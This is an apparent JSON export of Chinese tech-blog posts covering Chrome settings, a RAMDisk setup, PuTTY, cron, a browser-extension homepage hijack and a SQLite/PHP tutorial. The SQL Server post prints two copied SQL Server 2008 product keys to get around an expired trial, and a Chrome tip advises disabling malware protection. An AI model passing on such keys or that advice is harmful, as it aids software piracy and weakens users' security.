--enable-user-scripts ，之后将后缀为 .user.js 的文件下载到配置文件夹的User Scripts文件夹中即可。需要卸载时，直接删除即可。 Userscripts.org 此网站有大量的脚本可供使用（会有部分不能正常工作），相当于UserScripts脚本的官网。 值得其他浏览器借鉴的地方 1.自带的任务管理器（快捷键Shift+Esc）浏览器、标签页、扩展、插件的内存占用一目了然，用处当然不一而足：强制关闭有问题的标签、方便找出有 问题的扩展或插件…… 2.每当您打开一个新的标签页，就会直观地看到您最常访问的网站、最常使用的搜索引擎、最近加入书签的页面以及最近关闭的标签页等等。 3.能够直接粘贴纯文字（快捷键Ctrl+Shift+V） 需要改进的地方 1.大量文件操作，加速硬盘老化； 解决方法： (1)取消勾选“选项”-“高级选项”中的“启用网络欺诈和恶意软件 保护”和“将使用统计信息和崩溃报告自动发送给谷歌，帮助我们完善谷歌浏览器” [via] (2)删除 Chrome 安装目录中的 rlz.dll 文件（同时也是为了保护隐私） (3)最好的方法是将cache文件夹设置到内存盘 [via] 2.强制安装到系统 所在分区，不尊重用户习惯 3.默认添加Google Update 服务，没有选择余地 4.扩展不够强大，没有官方的扩展网站#已经有了：https://chrome.google.com/extensions?hl=en-US，不过有些时期要翻墙或者hosts设置，网上搜索下就有了。 5.能够使用的参数多并不是好事，希望以后的版本中大多数参数能够直接在浏览器中设置。参数过多可以使用批处理文件来管理。 6.每个Google Chrome用户都包含一个唯一ID，Google通过它来收集用户信息，而普通用户是无法轻易删除此ID。 UnChrome的作用就是屏蔽ID号，用Null的空值来替换它，以便浏览器无法有效识别，保护个人隐私。UnChrome的修改操作不会对 Chrome的功能有任何影响，你依旧可以正常使用。使用方法：关闭Chrome浏览器，随后运行UnChrome，并点击其主界面中的“Remove unique ID now”。 运行一次UnChrome后即可删除，即使以后升级Chrome，屏蔽ID号效果仍会保持。 设置默认带参数启动注册表,这里提供一份我已经设置好的注册表. 12345678910111213#本人缓存放在内存盘R盘中,所以参数中带路径: --disk-cache-dir=&quot;R:chromecache&quot;#@=&quot;&quot;C:UserssobaiguAppDataLocalGoogleChromeApplicationchrome.exe&quot;表示我电脑里的谷歌浏览器安装路径,请根据自己机器上的实际情况进行修改.Windows Registry Editor Version 5.00[HKEY_CLASSES_ROOTftpshellopencommand]@=&quot;&quot;C:UserssobaiguAppDataLocalGoogleChromeApplicationchrome.exe&quot; --disk-cache-dir=&quot;R:chromecache&quot; -- &quot;%1&quot;&quot;[HKEY_CLASSES_ROOThttpshellopencommand]@=&quot;&quot;C:UserssobaiguAppDataLocalGoogleChromeApplicationchrome.exe&quot; --disk-cache-dir=&quot;R:chromecache&quot; -- &quot;%1&quot;&quot;[HKEY_CLASSES_ROOThttpsshellopencommand]@=&quot;&quot;C:UserssobaiguAppDataLocalGoogleChromeApplicationchrome.exe&quot; --disk-cache-dir=&quot;R:chromecache&quot; -- &quot;%1&quot;&quot;[HKEY_CLASSES_ROOTChromeHTMLshellopencommand]@=&quot;&quot;C:UserssobaiguAppDataLocalGoogleChromeApplicationchrome.exe&quot; --disk-cache-dir=&quot;R:chromecache&quot; -- &quot;%1&quot;&quot;","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"},{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"让32位系统用尽4G内存--RAMDISK使用详解（转载）","slug":"win32-4g-ramdisk","date":"2013-11-18T15:48:29.000Z","updated":"2024-09-28T00:17:21.254Z","comments":true,"path":"win32-4g-ramdisk.html","permalink":"https://sobaigu.com/win32-4g-ramdisk.html","excerpt":"","text":"前言 由于内存便宜，现在不少本本标配基本都是2GB，也有不少已经开是配4GB的，例如Y530A-PEI等，也有不少人购买新NB时，基于一次到位原则，一次将自己的本本内存加到4GB攻顶，或者后期升级至4GB，例如我的Y510A高配，虽然现在大部分的NB硬件抓得到4GB，但却没保证软件的操作系统可以抓到4GB，只要是32位的Windows XP或Windows Vista，都只能抓到3GB，难道一定要装64位的Windows XP或Windows Vista才能解决吗?下面是我总结网上的经验及我自己的经历写的：） 问题 理论上32位的操作系统可以抓到4GB，但从Windows XP SP2后，基于一些原因，微软让32位的XP和Vista都只能抓到3GB，当然装64位的XP或Vista是好方法，但是联想64位的驱动还是没有完善，加上如今绝大部分的应用程序仍是32位，一来64位操作系统兼容性堪忧，二来在64位操作系统跑32位应用程序速度更慢，所以绝大部分的用户仍选择32位的操作系统。 大家会想将内存加到4GB，无疑就是希望自己的NB跑得更快，但32位操作系统先天只能抓到3GB的事实无法改变，所以我们转而希望XP能『用』到4GB，并且让NB跑得更快，这样钱就没有白花了。 解决方案 我们希望将XP抓不到的1GB给RamDisk用，利用RamDisk来加速NB。什么是RamDisk呢?简单的说，就是将内存仿真成硬盘，由于内存速度远快于硬盘，将大幅增加I/O速度，这样NB就跑得更快了。 安装 Ramdisk 前奏 确认你的系统打开了PAE（物理地址拓展），方法可以用EVEREST查看，也有其他方法，我就不一一表述了，自己网上搜一下，重点讲下如何打开，现在的硬件基本上都支持PAE，一些老的可能不支持：） XP系统打开PAE：打开c:\\boot.ini,删除里面的/EXECUTE, /NOEXECUTE=AlwaysOff等等参数，增加/PAE参数,确定系统已打开PAE.现在大多优化的32位XP都是默认就打开了PAE，那这步就可忽略。 VISTA系统：（1）、点击开始菜单，在搜索框(或运行框)中输入&quot;cmd&quot;，按下 Ctrl + Shift + Enter (进入cmd的管理员模式)（ 2）、输入以下命令并回车即可: BCDEdit /set PAE forceenable 。 进入主题 Step 1： 下载Ramdisk_4G[点击超链接下载]，这是个修改过的版本，让RamDisk能建立在XP所抓不到的1GB上。 Step 2： 将Ramdisk_4G解压缩然后放到C:rogram Files目录下。 Step 3： 执行ram4g.reg，将对registry做一些必要的修正。 一定要做这一步，开始我没有注意，结果是在系统用的3GB里面分了1GB出来。 Step 4： 执行ramdisk.exe，出现以下画面。设定Disk Size为1G，Drive Letter预设为R:，可自行调整，Media Type选择Fixed Media，选择建立，最后按结束。 Step 5： 重新启动，就会发现可用内存没有减少，却多了一台1G的RamDisk。 到此我们已经把其中系统用不上的1GB虚拟了一个盘,但是怎么用才能达到当内存用的效果呢，不可能就当硬盘用吧？下面来说说怎么利用它加速我们的系统： 使用1G RamDisk加快速度 RamDisk设定好后，只是让RamDisk『用』到XP用不到的1GB而已，还不能加快速度，还需做以下设定：1：将虚拟内存设定到RamDisk 理论上只要内存够多，是不需设定虚拟内存，尽管XP只能抓到3GB，也是相当够用，不过有些应用程序(如Photoshop)在启动时会检查虚拟内存是否存在，若不存在会提出警告；有些应用程序若没设定虚拟内存，会导致执行不稳定，所以一般来说还是建议设定虚拟内存，传统由于将虚拟内存设定在硬盘，由于硬盘速度慢，导致整体效能变差，不过由于现在将虚拟内存设定在RamDisk，等于还是在内存跑，所以不会影响效率。 要将虚拟内存设定多大呢?这要看你实际要跑的应用程序而定，以我个人常用的Visual Studio、Quartus II、Nios IIEDS、ModelSim、Photoshop等大型软件而言，设定512MB虚拟内存在RamDisk就可以跑的很顺。我个人设在300到512MB。 Step 1： 我的计算机&gt;右键单击，选择&lt;属性&gt;，点选[高级]，在&lt;效能&gt;下按&lt;设定&gt;按钮。 Step 2： 选&lt;高级&gt;，在&lt;虚拟内存&gt;部分按下&lt;改变&gt;。 设定512MB虚拟内存在RamDisk上，你可依照你实际需要改变之。 将Temporary Internet Files设定到RamDisk IE每次浏览网页时，会将HTML和图片下载到硬盘，现在改成下载到RamDisk，将有助于IE执行速度。实际上会比硬盘快一点，尤其是打开图片等比较多的网站，当然前提是你网速够快：） Step 1： 工具-&gt;英特网选项 Step 2： 按下&lt;设定&gt; Step 3： 按下&lt;移动文件夹&gt;，将目录设定到RamDisk。 设定系统变量Temp 很多应用程序在执行过程都会产生暂存盘，然后将暂存盘存放在系统变量所指定的目录。如Photoshop执行当中会产生大量的暂存档，若将暂存档存放在RamDisk，将大幅提升Photoshop执行速度。 Step 1： 在&lt;我的计算机&gt;右键单击，选择&lt;属性&gt;，点选[高级]，按下&lt;环境变量&gt;按钮。 Step 2： 将TEMP和TMP两变量改到RamDisk上。这样设定后，大部分的应用程序都会将暂存盘存放在RamDisk了，不过有些应用程序对于暂存盘有自己的设定，所以请自行设定之。但是这样设定有个不好的地方，例如你一个压缩文件你不想解压缩就打开里边比较大的文件，超过你的RAMDISK盘剩余空间的时候就会打不开。所以请自己考量是否需要。 将P2P下载的软件放到RamDisk P2P唯一最让人诟病的是伤硬盘，若将要分享的档案放在RamDisk中，则硬盘完全不需读写，由于P2P软件众多，请自行设定之。 可以把一些文件或者程序（绿色软件）放到Ramdisk上运行和打开，那会非常快。当然是空间足够大的情况下。 PS：另外提醒一下，RAMDISK由于是用内存虚拟出来的，免不了关机后上面的文件会丢失，所以重要资料请不要放在上面，以免丢失！ 总结 内存要怎么使用，各有巧妙不同，若花钱买了大量的内存，只是放在那边没用，也是一种浪费。除了一些非常耗内存的软件，如VMWare、SQLServer、Oracle…等，一般来说，WindowsXP只要有2GB的内存就可以跑的非常顺，若加到4GB，另外2G的内存该怎么善加利用，就是一门艺术了。由于32位的WindowsXP/Vista只能抓到3GB，将抓不到的1GB给RamDisk用可以说是绝配，论坛常有用户询问反应装了4GB内存后，但WindowsXP抓不到4GB内存的问题，或和想了解RAMDISK的朋友，希望本文能有帮助。 备注目前这个方法我用Y510A机器在32位Windows XP Pro和Vista U版本测试成功，Vista已经用了近一个月了，稳定性没有问题但是我u知道其他机器是否可行，还请自行实验，有问题可以跟我交流。 开始我没有导入注册表文件，结果我分的是系统用的3GB里面的，所以使用内存立马上升到68%左右。以为不行了，后来再试就OK了。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"microsoft sql server management studio(SSMS)提示过期解决办法","slug":"ssms-evaluation-period-has-expired","date":"2013-11-06T11:29:28.000Z","updated":"2024-09-28T00:17:21.253Z","comments":true,"path":"ssms-evaluation-period-has-expired.html","permalink":"https://sobaigu.com/ssms-evaluation-period-has-expired.html","excerpt":"前言 安装SQL Server 2008的时候没有输入序列号，最近到期了，启动时SQL Server Management Studio提示已过期,且没地方让重新输入序列号等。 在网上找了一个方法:","text":"前言 安装SQL Server 2008的时候没有输入序列号，最近到期了，启动时SQL Server Management Studio提示已过期,且没地方让重新输入序列号等。 在网上找了一个方法: 解决方法 修改注册表 开始&gt;运行&gt;输入regedit,找到如下注册表项： 1HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\100\\ConfigurationState 将CommonFiles键值更改为3,如果不改的话后面升级即便输入了序列号也是提示过期的. 如果嫌麻烦,可以我把我导出来的注册表内容保存为reg文件右键导入/合并即可: 1234Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\100\\ConfigurationState]&quot;CommonFiles&quot;=dword:00000003 运行SQL Server Installation Center 找到开始菜单中sql安装程序组,有个SQL Server Installation Center,运行选择维护&gt;版本升级,会经过安装时的那种环境检测,符合后点确定. 重新输入序列号 下一步就是普通的安装步骤了,在输入cdkey的时候网上找个序列号输入,按提示安装完成即可. 从参考链接里抄来的两个cdkey: SQL Server 2008 序列号 开发版: PTTFM-X467G-P7RH2-3Q6CG-4DMYB 企业版: JD8Y6-HQG69-P9H84-XDTPG-34MBB 参考链接: http://blog.csdn.net/kevinsqlserver/article/details/7893255 http://friendship517.blog.163.com/blog/static/5705127820118239518991/","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"Linux下putty复制粘贴方法","slug":"putty-for-linux-copy-sth","date":"2013-10-15T14:42:01.000Z","updated":"2024-09-28T00:17:21.253Z","comments":true,"path":"putty-for-linux-copy-sth.html","permalink":"https://sobaigu.com/putty-for-linux-copy-sth.html","excerpt":"putty是个远程控制终端软件，虽然不如 secureCRT 功能强大，但在Linux下，此软件是个不错的替代。 远程操作终端的时候总会涉及到一些复制粘贴等操作，Windows系统下几乎是通用，ctrl+c复制，ctrl+v粘贴，或者选择即复制，右键即粘贴，或者右键可选择。 而命令终端操作时，ctrl+c是取消。","text":"putty是个远程控制终端软件，虽然不如 secureCRT 功能强大，但在Linux下，此软件是个不错的替代。 远程操作终端的时候总会涉及到一些复制粘贴等操作，Windows系统下几乎是通用，ctrl+c复制，ctrl+v粘贴，或者选择即复制，右键即粘贴，或者右键可选择。 而命令终端操作时，ctrl+c是取消。 google了半天，所有的教程几乎都是说Windows操作系统下的使用方法… 其实在Linux下的putty复制粘贴也很简单： 左键选中需要复制的内容，再在选中内容反色范围内右键即完成复制 鼠标中键粘贴 就一个粘贴问题，网络上居然没有答案，果然还是要自己一个个去试才行","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"},{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"取消chrome新开标签页的google搜索框","slug":"chrome-new-tab-google-box","date":"2013-10-10T13:53:05.000Z","updated":"2024-09-28T00:17:21.253Z","comments":false,"path":"chrome-new-tab-google-box.html","permalink":"https://sobaigu.com/chrome-new-tab-google-box.html","excerpt":"","text":"chrome升级已经司空见惯了,这次chrome升级后,当打开新标签页时,会在常用网址的8宫格上方停放一个google搜索框. 这个搜索框输入搜索的时候会自动将焦点转移到地址栏,也就是说该功能实际上是地址栏搜索功能,输入的时候焦点自动转移到左上角地址栏,在新开标签多出个大大的google logo实在有点怪怪的,而且占用了一半的屏幕空间,下方的快速访问标签就变得有点小. 对于已经习惯或熟练使用地址栏搜索的用户来说,在新开标签页添加的这个搜索框完全没必要,所以我们将这个功能关闭. 方法是地址栏输入: chrome://flags 找到以下内容: Enable Instant Extended API Mac, Windows, Chrome OS Enables the Instant Extended API which provides a deeper integration with your default search provider, including a renovated New Tab Page, extracting search query terms in the omnibox, a spruced-up omnibox dropdown and Instant previews of search results as you type in the omnibox. #enable-instant-extended-api 很难找的话直接搜索&quot;enable-instant-extended-api&quot;,中文版应该翻译成&quot;启用即时扩展API&quot;,不管中文版还是英文版搜索英文这个标识还是在的.找到后将下方状态至于disable或禁用,然后重启chrome就可以了. 在新开标签页打开的其实是这个地址: chrome-search://local-ntp/local-ntp.html?isGoogle 如果按以上设置无法关闭,请查找NTP,然后将对应设置设置成disable试试吧,各版本之间貌似有点差异. PS:最新版本33已经是不可设置关闭,如果你更改默认搜索引擎为非google,google这个大大的logo是不显示了,可标签略缩图还是那么小,反而更难看. 这个功能官博上早有说明,看来谷歌是铁了心要在新建标签页添加这多余的玩意儿影响用户习惯了,大伙儿老老实实躺着,别乱动吧.","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"CentOS系统下取消定时任务","slug":"cancel-crond-task","date":"2013-10-05T12:14:29.000Z","updated":"2024-09-28T00:17:21.253Z","comments":true,"path":"cancel-crond-task.html","permalink":"https://sobaigu.com/cancel-crond-task.html","excerpt":"","text":"之前为了让VPS的free值好看点，给VPS系统加了个定时重启任务，见之前的文章“让centos定期重启“。 现在想想，其实大可不必，每周都重启，这不是辱沫了Linux的名声么，况且每周重启也没见得有多少效果，反正都感觉不出来，那就取消定时自动重启吧。 当时增加定时任务的时候用的所crond命令，那需要取消定时任务时我们则需要使用crontab命令。 1234567891011[root@sobaigu ~]# crontab --helpcrontab: invalid option -- -crontab: usage error: unrecognized optionusage: crontab [-u user] file crontab [-u user] [ -e | -l | -r ] (default operation is replace, per 1003.2) -e (edit user&#x27;s crontab) -l (list user&#x27;s crontab) -r (delete user&#x27;s crontab) -i (prompt before deleting user&#x27;s crontab) -s (seLinux context) crontab不支持–help选项,用什么参数调出帮助说明我也不知道,反正目的达到了. 我们先用crontab -l查看都有什么定时任务 12[root@sobaigu ~]# crontab -l0 7 * * 1 reboot 定时任务的具体意思这就不重复了，看之前的笔记，我这只有一个，默认删除当前用户的任务，那剩下就毫不留情地使用-r就解决了。 123[root@sobaigu ~]# crontab -r[root@sobaigu ~]# crontab -lno crontab for root OK，一切都SO EASY。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"chrome打开hao123时跳http://www.ttx123.cn","slug":"openttx123-in-chrome","date":"2013-09-30T05:29:30.000Z","updated":"2024-09-28T00:17:21.253Z","comments":true,"path":"openttx123-in-chrome.html","permalink":"https://sobaigu.com/openttx123-in-chrome.html","excerpt":"","text":"突然脑残打开了下hao123,这一打开不要紧,居然发现打开这弱智网站的时候,中间有个地址中转了下,首页被劫持了. 因为几乎不用hao123,所以这问题什么时候开始有就不清楚了.总之,可以肯定的是浏览器被强奸了! 这个中转地址是http://www.ttx123.cn/?u=666666或其他?u=后缀,然后跳转到:http://www.hao123.com/?tn=,有时候会露下他的本性:http://www.hao123.com/?tn=29065018_114_hao_pg,不同的?u=后缀对应的hao123.com/?tn=后缀也不一样. tn=29065018_114_hao_pg,这个传说中的计费id,字眼中带114,自己所处的确实是电信网络,以为是电信DNS劫持做的,可换了DNS也一样,不得不怀疑浏览器扩展了. chrome装了不少扩展,那就将当前启用状态的扩展二分法排除,最后禁用Qvod扩展就好了. 快播chrome插件,Qvod播放器插件,快播视频插件 1.0.0.4 Qvod播放器插件,快播chrome插件,快播视频插件 [Permissions](chrome://extensions-frame/?id=gighmmpiobklfepjocnamgkkbiglidom#) [Visit website](https://chrome.google.com/webstore/detail/immndeekgmeklobhkpidchbfeenejmil)Enable 再次确认,就是这货,卸掉就天下太平了. 以前china weather也在右下角弹广告窗口,chrome扩展,也不得不防啊.","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"轻型数据库SQLite结合PHP的开发","slug":"php-with-sqlite","date":"2013-09-17T12:01:01.000Z","updated":"2024-09-28T00:17:21.253Z","comments":true,"path":"php-with-sqlite.html","permalink":"https://sobaigu.com/php-with-sqlite.html","excerpt":"","text":"SQLite是一款轻型的数据库，它的设计目标是嵌入式的，而且目前已经在很多嵌入式产品中使用了它，它占用资源非常的低，在嵌入式设备中，可能只需要几百K的内存就够了。它能够支持Windows/Linux/Unix等等主流的操作系统，同时能够跟很多程序语言相结合，比如Tcl、PHP、Java等，还有ODBC接口，同样比起Mysql、PostgreSQL这两款开源世界著名的数据库管理系统来讲，它的处理速度比他们都快。 SQLite虽然很小巧，但是支持的SQL语句不会逊色于其他开源数据库，它支持的SQL包括： 12345678910111213141516171819202122232425ATTACH DATABASEBEGIN TRANSACTIONcommentCOMMIT TRANSACTIONCOPYCREATE INDEXCREATE TABLECREATE TRIGGERCREATE VIEWDELETEDETACH DATABASEDROP INDEXDROP TABLEDROP TRIGGERDROP VIEWEND TRANSACTIONEXPLAINexpressionINSERTON CONFLICT clausePRAGMAREPLACEROLLBACK TRANSACTIONSELECTUPDATE 同时它还支持事务处理功能等等。也有人说它象Microsoft的Access，有时候真的觉得有点象，但是事实上它们区别很大。比如SQLite支持跨平台，操作简单，能够使用很多语言直接创建数据库，而不象Access一样需要Office的支持。如果你是个很小型的应用，或者你想做嵌入式开发，没有合适的数据库系统，那么现在你可以考虑使用SQLite。目前它的最新版本是 3.2.2，它的官方网站是：http://www.sqlite.org，能在上面获得源代码和文档。同时因为数据库结构简单，系统源代码也不是很多，也适合想研究数据库系统开发的专业人士。 现在我们开始简单的介绍，主要我是想讲清楚几个问题，一是如何安装使用，二是如何跟PHP结合开发。 一、安装 1. Windows平台 下载Windows下的文件，其实就是一个命令行程序，（下载地址：http://www.sqlite.org/sqlite-3_2_2.zip），这个命令行程序用来包括生成数据库文件、执行SQL查询、备份数据库等等功能。 下载后比如我们解压缩到 D:Downloadssqlitesqlite-3_2_2 这个目录下，那么我们进入cmd，并且进入该目录： 123cd D:Downloadssqlitesqlite-3_2_2D:Downloadssqlitesqlite-3_2_2&gt;sqlite3 test.db 如果test.db不存在，那么就产生一个数据库文件，如果存在就直接使用该数据库文件，相当于mysql中的use 12345SQLite version 3.2.2Enter &quot;.help&quot; for instructionssqlite&gt; SQLite的提示符，如果想查看命令帮助输入 .help，在sqlite中所有系统命令都是 . 开头的： 1234567891011121314151617181920212223242526272829303132sqlite&gt; .help.databases List names and files of attached databases.dump ?TABLE? ... Dump the database in an SQL text format.echo ON|OFF Turn command echo on or off.exit Exit this program.explain ON|OFF Turn output mode suitable for EXPLAIN on or off..header(s) ON|OFF Turn display of headers on or off.help Show this message.import FILE TABLE Import data from FILE into TABLE.indices TABLE Show names of all indices on TABLE.mode MODE ?TABLE? Set output mode where MODE is one of:csv Comma-separated valuescolumn Left-aligned columns. (See .width)html HTML &lt;table&gt; codeinsert SQL insert statements for TABLEline One value per linelist Values delimited by .separator stringtabs Tab-separated valuestcl TCL list elements.nullvalue STRING Print STRING in place of NULL values.output FILENAME Send output to FILENAME.output stdout Send output to the screen.prompt MAIN CONTINUE Replace the standard prompts.quit Exit this program.read FILENAME Execute SQL in FILENAME.schema ?TABLE? Show the CREATE statements.separator STRING Change separator used by output mode and .import.show Show the current values for various settings.tables ?PATTERN? List names of tables matching a LIKE pattern.timeout MS Try opening locked tables for MS milliseconds.width NUM NUM ... Set column widths for &quot;column&quot; modesqlite&gt; 我们创建一个数据库catlog 1234567891011sqlite&gt; create table catalog(...&gt; id integer primarykey,...&gt; pid integer,...&gt; name varchar(10) UNIQUE...&gt; );sqlite&gt; 如果表存在就会提示： SQL error: table catalog already exists 我们创建索引信息 1create index catalog_idx on catalog (id asc); 我们查看表的信息，看有多少个表 123sqlite&gt; .tableaa catalog 查看表的结构： 1234567sqlite&gt; .schema catalogCREATE TABLE catalog(id integer primary key,pid integer,name varchar(10) UNIQUE);CREATE INDEX catalog_idx on catalog(id asc); 给数据表插入一条记录 1sqlite&gt; insert into catalog (ppid,name) values (&#x27;001&#x27;,&#x27;heiyeluren&#x27;); 成功无任何提示，如果表达式错误提示错误信息： SQL error: near “set”: syntax error 检索有多少条记录 123456789sqlite&gt; select count(*) from catalog;1# 检索搜索记录sqlite&gt; select * from catalog;1|1|heiyeluren 反正使用标准的SQL来操作就没有问题，不清楚可以去官方网站上查看帮助信息。另外还要说明的是SQLite不支持修改表结构，如果要修改表结构，只有删除表重新再建立，所以建立表的时候一定要考虑扩展性。估计以后这方面的功能会加强。 2. Linux/Unix 平台 error: 目前还没装过，呵呵，不过估计跟Windows差不多，改天把这部分内容补上。 二、PHP对SQLite的开发 PHP 5开始不再默认支持Mysql，而是默认支持SQLite，可见它的影响力多么大，所以如果你想做SQLite的PHP开发，建议你使用PHP 5.0.0以上版本，我目前使用的是 PHP 5.0.4版本，直接支持SQLite扩展，这里我就不仔细讲如何安装PHP扩展，如果不清楚可以查看PHP相关文档。 这里我主要是讲针对SQLite的开发。目前PHP的主流DB类都支持SQLite的驱动，包括PEAR::DB类、ADOdb类都支持，所以使用DB来来做开发也是个好的选择。 (以下操作为了简便，都是再Windows xp平台进行的) 1. 使用PHP操作已经建立好的sqlite数据库 如果你有一个已经通过sqlite.exe建立好了的数据库和表结构，那么你就能够直接对它进行操作。php中针对sqlite的处理函数比较多，你可以查看PHP手册获得详细信息。 我们使用sqlite_open()函数来打开一个sqlite数据库，它成功返回一个操作资源，失败返回false，那么以后的所有操作都是在这个资源上进行的，执行一个sql查询使用sqlite_query函数。 下面我假设你在当前PHP程序目录下有一个abc.db的sqlite数据库文件，我们对该文件进行操作： 12345678910111213141516&lt;?php//打开sqlite数据库$db = @sqlite_open(&quot;abc.db&quot;);//异常处理if (!$db) die(&quot;Connection Sqlite failed.&quot;);//添加一个叫做foo的数据库@sqlite_query($db, &quot;CREATE TABLE foo (bar varchar(10))&quot;);//插入一条记录@sqlite_query($db, &quot;INSERT INTO foo VALUES (&#x27;fnord&#x27;)&quot;);//检索所有记录$result = @sqlite_query($db, &#x27;select bar from foo&#x27;);//打印获取的结果print_r(sqlite_fetch_array($result)); ?&gt; 我们看到的输出结果是： 12345Array([0] =&gt; fnord[bar] =&gt; fnord) 证明我们代码执行成功，没有输入请检查程序，或者你的数据库文件是否存在。 那么有了这个基本操作，你就能够考虑使用更复杂的操作和SQL来操作它，让它帮你管理信息，你可以做一个留言本，或者做一个CMS系统，我想都是没有问题的。 2. 使用PHP建立数据库并且操作 如果你没有任何sqlite.exe之类的工具，那么你也能够通过php来创建一个sqlite数据库，并且对它进行管理。 其实通过sqlite.exe程序建立的数据库，内容是空的，其实只有后来等创建表，添加数据以后，数据库文件才有，那么我们是不是能够手工添加一个文件，比如一个空的 test.db 文件，并且对它进行操作。这是完全可以，下面我们就使用PHP程序来完成创建一个数据库，并且执行简单的建立数据表，插入数据和检索数据的功能。 首先我们来看代码：（代码比较长，但比较容易理解） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;?php/*** 文件：sqlite.php* 功能：对sqlite数据库的处理* 作者：heiyeluren* 时间：2005-8-5*/define(&quot;LN&quot;, __LINE__);//行号define(&quot;FL&quot;, __FILE__);//当前文件define(&quot;DEBUG&quot;, 0);//调试开关 $db_name = &quot;heiyeluren.db&quot;;//创建数据库文件,文件内容为空if (!file_exists($db_name)) &#123;if (!($fp = fopen($db_name, &quot;w+&quot;))) &#123;exit(error_code(-1, LN));&#125;fclose($fp);&#125;//打开数据库文件if (!($db = sqlite_open($db_name))) &#123;exit(error_code(-2, LN));&#125;//产生数据表结构if (!sqlite_query($db, &quot;DROP TABLE test&quot;)) &#123;exit(error_code(-3, LN));&#125;if (!sqlite_query($db, &quot;CREATE TABLE test (id integer primary key,pid integer,name varchar(10) UNIQUE)&quot;)) &#123;exit(error_code(-3, LN));&#125;//插入一条数据if (!sqlite_query($db, &quot; INSERT INTO test (name) VALUES (&#x27;heiyeluren&#x27;) &quot;)) &#123;exit(error_code(-4, LN));&#125;//把数据检索出来if (!($result = sqlite_query($db, &quot;SELECT * FROM test&quot;))) &#123;exit(error_code(-5, LN));&#125; //获取检索数据并显示while ($array = sqlite_fetch_array($result)) &#123;echo &quot;ID: &quot;. $array[id] .&quot;&lt;br&gt;Name: &quot;. $array[name] ;&#125; /* 错误信息代码函数 */function error_code($code, $line_num, $debug=DEBUG)&#123;if ($code&lt;-6 || $code&gt;-1) &#123;return false;&#125;switch($code) &#123;case -1: $errmsg = &quot;Create database file error.&quot;;break;case -2: $errmsg = &quot;Open sqlite database file failed.&quot;;break;case -3: $errmsg = &quot;Create table failed, table already exist.&quot;;break;case -4: $errmsg = &quot;Insert data failed.&quot;;break;case -5: $errmsg = &quot;Query database data failed.&quot;;break;case -6: $errmsg = &quot;Fetch data failed.&quot;;break;case -7: $errmsg = &quot;&quot;;break;default: $errmsg = &quot;Unknown error.&quot;;&#125; $m = &quot;&lt;b&gt;[ Error ]&lt;/b&gt;&lt;br&gt;File: &quot;. basename(FL) .&quot; &lt;br&gt;Line: &quot;. LN .&quot;&lt;br&gt;Mesg: &quot;. $errmsg .&quot;&quot;;if (!$debug) &#123;($m = $errmsg);&#125;return $m;&#125; ?&gt; 如果你操作无误的话，那么程序最后输出： 123ID: 1Name: heiyeluren 我们以上的程序包括了比较完整的功能，有调试、异常处理、存取数据库等功能，算是一个简单应用。如果你有兴趣也可以进行扩展。 结束： 我们基本的操作就讲到这里，以后有空我会把内容补全。如果大家有兴趣可以去研究一下，也许你的个人主页就需要这样的小型数据库来帮助你。 参考文档： http://www.donews.net/limodou/archive/2004/03/21/7997.aspx http://www.Linuxsir.org/bbs/showthread.php?p=1213668#post1213668 SQLite资源 官方网站：http://www.sqlite.org SQL语法： http://www.sqlite.org/lang.html 开发文档：http://www.sqlite.org/docs.html 常见问题：http://www.sqlite.org/faq.html 下载地址：http://www.sqlite.org/download.html 资源下载： SQLite的源码：http://www.sqlite.org/sqlite-source-3_3_4.zip(包括sqlite3.h) SQLite编译好的dll及def文件:http://www.sqlite.org/sqlitedll-3_3_4.zip SQLite提供一个命令行shell的工具用以访问数据库，下载Windows下的SQLite命令行工具sqlite3.exe, 下载地址:http://www.sqlite.org/sqlite-3_3_4.zip。 网上有一款针对SQLite3的 UI工具－SQLite Spy。下载地址：www.yunqa.de/delphi/sqlitespy/ 如果想通过ODBC来访问操作SQLite数据库,需要安装第三方组件库的SQLite ODBC Driver, 可以到&quot;http://www.patthoyts.tk/sqlite3odbc.html&quot;或者&quot;http://www.ch-werner.de/sqliteodbc/&quot;去下载. 